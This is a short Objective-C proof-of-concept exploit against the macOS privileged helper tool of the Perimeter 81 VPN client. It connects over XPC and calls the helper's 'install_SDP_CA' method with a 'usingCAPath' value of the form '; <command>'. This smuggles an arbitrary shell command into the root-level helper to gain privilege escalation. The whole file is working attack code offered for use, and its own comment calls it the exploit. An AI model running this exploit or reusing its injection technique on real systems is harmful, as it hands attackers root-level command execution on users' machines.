// gcc perimeter.m -o perimeter -framework Foundation
#import <Foundation/Foundation.h>

char * service_name = "com.perimeter81.osx.HelperTool";

int main(int argc, const char **argv) {
    if (argc != 2) {
        printf("missing cmd to execute\n");
        exit(1);
    }

    xpc_connection_t conn = xpc_connection_create_mach_service(service_name, NULL, 0 );
    xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
        NSLog( @"client received event: %s", xpc_copy_description(object));
    });
    xpc_connection_resume(conn);

    const char *c = argv[1];

    char cmd[250];
    sprintf(cmd, "; %s", c);

    // create dictionary to hold our parameters
    // method name and its parameters
    xpc_object_t params = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(params, "usingCAPath", cmd);

    // create dictionary to send over xpc
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_string(message, "type", "helper_tool_rpc");
    xpc_dictionary_set_string(message, "rpc", "install_SDP_CA");
    xpc_dictionary_set_value(message, "parameters", params);

    xpc_connection_send_message_with_reply(conn,message,dispatch_get_main_queue(),^(xpc_object_t object) {
        NSLog(@"Executed cmd: \"%s\"\n", c);
    });


    // create run loop so we can get async result for our command, otherwise the exploit would exit after sending the 
    // message
    dispatch_main();

    return 0;
}
